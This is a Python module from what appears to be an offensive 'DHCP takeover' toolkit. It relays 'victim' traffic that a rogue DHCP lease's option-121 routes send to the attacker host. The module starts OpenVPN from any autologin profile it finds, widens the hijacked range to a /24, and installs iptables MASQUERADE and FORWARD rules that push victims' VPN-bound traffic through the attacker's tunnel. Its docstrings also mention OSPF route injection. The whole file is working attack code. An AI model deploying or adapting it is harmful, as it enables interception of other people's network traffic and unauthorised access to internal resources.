#!/usr/bin/env python3
# v2.0
"""
vpn_relay.py — selective VPN-subnet relay for the DHCP takeover toolkit (Linux).

This module does NOT build DHCP packets.  It only:
  1. Detects whether the host has an active VPN tunnel; if not, finds an OpenVPN
     autologin profile and starts OpenVPN.
  2. Reads the VPN subnets routed via the tunnel.
  3. Configures the option-121 policy on server_details so dhcp_takeover's single
     build_dhcp_response injects the right routes (no duplicated packet code).
  4. Installs Linux iptables rules so victim traffic destined for VPN subnets is
     MASQUERADEd through the tunnel, while all other traffic is left untouched
     (victims send it straight to the real router via the opt-121 default route).

Resulting victim traffic flows after our lease is accepted:

    VPN-bound (e.g. 10.8.0.0/24):
      victim -> (opt121 next-hop = our identity) -> host phys iface -> iptables
      -> MASQUERADE -> tun0 -> VPN server -> resource

    Internet (e.g. 8.8.8.8):
      victim -> (opt121 default = real router) -> internet
      (this host never sees the packet)

Public API (used by main.py):
    enable_vpn_relay(server_details, phys_iface) -> tun_iface | None
    teardown()        # also auto-registered via atexit / SIGINT / SIGTERM

Linux only.  Requires root, iptables, iproute2, and (if no tunnel is up) openvpn.
"""

import atexit
import glob
import ipaddress
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time

from dhcp_takeover import print_step


# ── OpenVPN search paths ──────────────────────────────────────────────────────

OVPN_BINARY_PATHS = [
    "/usr/sbin/openvpn",
    "/usr/bin/openvpn",
    "/usr/local/sbin/openvpn",
    "/usr/local/bin/openvpn",
]

OVPN_PROFILE_DIRS = [
    os.path.dirname(os.path.abspath(__file__)),
]

OPENVPN_TUN_WAIT_TIMEOUT = 30  # seconds to wait for tun after starting OpenVPN


# ── Module-level state (mutated by setup; read by teardown) ──────────────────

_openvpn_proc = None          # subprocess.Popen if we started OpenVPN
_fwd_phys_iface = None
_fwd_tun_iface = None
_fwd_rules = []               # [(table_flag, args), ...] for teardown
_fwd_rules_lock = threading.Lock()
_cleanup_registered = False
_cleanup_done = False


# ── VPN detection ─────────────────────────────────────────────────────────────

def detect_host_vpn():
    """Return the name of the first up tun/tap interface on this host, or None."""
    for state_path in sorted(
        glob.glob("/sys/class/net/tun*/operstate")
        + glob.glob("/sys/class/net/tap*/operstate")
    ):
        try:
            with open(state_path) as f:
                if f.read().strip() == "up":
                    return state_path.split("/")[4]
        except OSError:
            continue
    return None


def _wait_for_tun(timeout=OPENVPN_TUN_WAIT_TIMEOUT):
    """Poll until a tun/tap interface appears; return its name or None on timeout."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        iface = detect_host_vpn()
        if iface:
            return iface
        time.sleep(0.5)
    return None


# ── OpenVPN profile discovery + startup ───────────────────────────────────────

def find_ovpn_binary():
    """Return the path to the openvpn executable, or None if not found."""
    for p in OVPN_BINARY_PATHS:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return shutil.which("openvpn")


def _needs_interactive_auth(path):
    """Return True if the profile has bare 'auth-user-pass' with no credential file.

    Bare 'auth-user-pass' (no argument) would block waiting for stdin input we
    can't provide.  Profiles with certificates, or 'auth-user-pass /credfile',
    run unattended.
    """
    try:
        with open(path, errors="replace") as f:
            for line in f:
                stripped = line.strip()
                if stripped.lower().startswith("auth-user-pass"):
                    parts = stripped.split()
                    if len(parts) == 1:
                        return True  # bare directive — needs interactive input
    except OSError:
        print_step("WARN", f"Cannot read profile {path} — skipping")
        return True  # treat unreadable profile as interactive to avoid blocking openvpn
    return False


def find_ovpn_profiles(extra_dirs=()):
    """Return [(abs_path, mtime), ...] for non-interactive .ovpn profiles, newest-first.

    Includes certificate-only profiles and credential-file profiles.
    Excludes profiles that require interactive username/password input.
    """
    dirs = list(OVPN_PROFILE_DIRS) + list(extra_dirs)
    found = {}
    for d in dirs:
        if not d:
            continue
        for p in glob.glob(os.path.join(d, "**", "*.ovpn"), recursive=True):
            abs_p = os.path.abspath(p)
            if not _needs_interactive_auth(abs_p):
                found[abs_p] = os.path.getmtime(abs_p)

    return sorted(found.items(), key=lambda x: x[1], reverse=True)


def start_openvpn_if_needed():
    """
    Ensure this host has an active VPN tunnel.

      1. If a tun/tap interface is already up, return it.
      2. Otherwise find autologin OpenVPN profiles.
      3. If a profile + openvpn binary exist, start OpenVPN with the newest
         profile and wait for the tun interface.
      4. Return the tun interface name, or None if no VPN could be established.
    """
    global _openvpn_proc

    tun = detect_host_vpn()
    if tun:
        print_step("OK", f"VPN already active on {tun}")
        return tun

    ovpn_bin = find_ovpn_binary()
    if not ovpn_bin:
        print_step("SKIP", "openvpn binary not found — no VPN relay")
        return None

    profiles = find_ovpn_profiles()
    if not profiles:
        print_step("SKIP", "No .ovpn profiles found — no VPN relay")
        return None

    profile_path, _ = profiles[0]
    print_step("START", f"Starting OpenVPN with autologin profile: {profile_path}")
    _openvpn_proc = subprocess.Popen(
        [ovpn_bin, "--config", profile_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
    )
    print_step("OK", f"OpenVPN started (pid {_openvpn_proc.pid})")

    print_step("START", f"Waiting up to {OPENVPN_TUN_WAIT_TIMEOUT}s for tun interface...")
    tun = _wait_for_tun()
    if tun:
        print_step("OK", f"VPN tunnel up on {tun}")
    else:
        print_step("FAIL", "tun interface did not appear — no VPN relay")
    return tun


# ── VPN subnet extraction ─────────────────────────────────────────────────────

def get_tun_net24(tun_iface):
    """
    Derive the /24 network covering the tun interface's assigned IP.

    The VPN may assign a narrower prefix (e.g. /28) but we inject the full /24
    so victims route the entire class-C block through us rather than just the
    narrow slice the server happened to assign.

      tun0 = 10.8.0.90/28  →  inject 10.8.0.0/24
    """
    try:
        out = subprocess.check_output(
            ["ip", "addr", "show", tun_iface],
            text=True,
            stderr=subprocess.DEVNULL,
        )
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/\d+", out)
        if m:
            net24 = str(ipaddress.IPv4Interface(f"{m.group(1)}/24").network)
            print_step("OK", f"tun IP: {m.group(1)}  →  target subnet: {net24}")
            return net24
    except (subprocess.CalledProcessError, ValueError):
        pass
    print_step("WARN", f"Could not read IP from {tun_iface} — cannot derive /24 subnet")
    return None


# ── Option 121 policy on server_details ───────────────────────────────────────

def configure_selective_relay(server_details, vpn_subnets):
    """Inject VPN subnets via our identity; keep a passthrough default route."""
    server_details["opt121_subnets"] = list(vpn_subnets)
    server_details["opt121_default_via_router"] = True
    print_step("OK", f"opt121 policy: relay {vpn_subnets} via us, default via real router")


def configure_passthrough(server_details):
    """No interception — victims get only a normal default route to the real router."""
    server_details["opt121_subnets"] = []
    server_details["opt121_default_via_router"] = True
    print_step("OK", "opt121 policy: passthrough only (default via real router)")


# ── Linux iptables forwarding ─────────────────────────────────────────────────

def _iptables(table_flag, args, *, check=True):
    """Run an iptables command; return True on success."""
    cmd = ["iptables"] + list(table_flag) + list(args)
    res = subprocess.run(cmd, capture_output=True, check=False)
    if res.returncode != 0 and check:
        print_step("WARN", f"iptables failed ({res.returncode}): {' '.join(cmd)}")
    return res.returncode == 0


def setup_victim_forwarding(phys_iface, tun_iface, vpn_subnets):
    """
    Enable kernel IP forwarding and MASQUERADE victim VPN traffic through tun.

    Per VPN subnet:
      nat POSTROUTING  -o <tun>  -d <subnet>  MASQUERADE
      FORWARD          -i <phys> -o <tun>  -d <subnet>  ACCEPT
    Once (shared return path):
      FORWARD          -i <tun>  -m state --state RELATED,ESTABLISHED  ACCEPT

    All rules are recorded in _fwd_rules for exact reversal at teardown.
    """
    global _fwd_phys_iface, _fwd_tun_iface

    _fwd_phys_iface = phys_iface
    _fwd_tun_iface = tun_iface

    for subnet in vpn_subnets:
        nat_args = ["-o", tun_iface, "-d", subnet, "-j", "MASQUERADE"]
        fwd_args = ["-i", phys_iface, "-o", tun_iface, "-d", subnet, "-j", "ACCEPT"]
        if _iptables(["-t", "nat", "-A", "POSTROUTING"], nat_args):
            with _fwd_rules_lock:
                _fwd_rules.append((["-t", "nat", "-D", "POSTROUTING"], nat_args))
        if _iptables(["-A", "FORWARD"], fwd_args):
            with _fwd_rules_lock:
                _fwd_rules.append((["-D", "FORWARD"], fwd_args))

    if vpn_subnets:
        return_args = ["-i", tun_iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"]
        if _iptables(["-A", "FORWARD"], return_args):
            with _fwd_rules_lock:
                _fwd_rules.append((["-D", "FORWARD"], return_args))

    print_step("OK", f"Forwarding installed: {phys_iface} → {tun_iface} for {vpn_subnets}")


# ── High-level entry points ───────────────────────────────────────────────────

def detect_vpn_subnet():
    """Detect or start the VPN and return (tun_iface, vpn_net24) or (None, None).

    Called early — before launching the OSPF adjacency engine — so the VPN
    subnet can be included in OSPF route injection.  Does NOT configure
    iptables or option 121; call enable_vpn_relay() for that.
    """
    tun = start_openvpn_if_needed()
    if not tun:
        return None, None
    vpn_net24 = get_tun_net24(tun)
    if not vpn_net24:
        print_step("SKIP", "VPN up but could not derive /24 — will use passthrough")
        return tun, None
    return tun, vpn_net24


def enable_vpn_relay(server_details, phys_iface, tun=None, vpn_net24=None):
    """Configure option 121 and install iptables forwarding for the VPN relay.

    If tun/vpn_net24 are supplied (pre-detected by detect_vpn_subnet), they are
    used directly so VPN detection is not repeated.  Otherwise detection runs now.

    Returns the tun interface name if selective relay is active, else None.
    Registers cleanup on first successful setup.
    """
    _register_cleanup()

    if tun is None or vpn_net24 is None:
        tun = start_openvpn_if_needed()
        if not tun:
            configure_passthrough(server_details)
            return None
        vpn_net24 = get_tun_net24(tun)
        if not vpn_net24:
            print_step("SKIP", "VPN up but could not derive /24 subnet — passthrough only")
            configure_passthrough(server_details)
            return None

    configure_selective_relay(server_details, [vpn_net24])
    setup_victim_forwarding(phys_iface, tun, [vpn_net24])
    return tun


# ── Cleanup ───────────────────────────────────────────────────────────────────

def teardown():
    """Remove iptables rules, restore ip_forward, and stop OpenVPN if we started it."""
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    with _fwd_rules_lock:
        rules_snapshot = list(reversed(_fwd_rules))
        _fwd_rules.clear()
    for table_flag, args in rules_snapshot:
        _iptables(table_flag, args, check=False)

    if _openvpn_proc is not None and _openvpn_proc.poll() is None:
        _openvpn_proc.terminate()
        try:
            _openvpn_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _openvpn_proc.kill()
        print_step("OK", "Stopped OpenVPN process")

    print_step("OK", "VPN relay teardown complete")


def _register_cleanup():
    global _cleanup_registered
    if _cleanup_registered:
        return
    _cleanup_registered = True
    atexit.register(teardown)
    # Chain signal handlers so a Ctrl+C tears down forwarding before exit.
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, lambda *_: (teardown(), sys.exit(0)))
        except (ValueError, OSError):
            # signal() only works in the main thread; ignore if unavailable.
            pass


if __name__ == "__main__":
    print_step(
        "FAIL",
        "vpn_relay.py is a library module. Run the toolkit via:  sudo python3 main.py",
    )
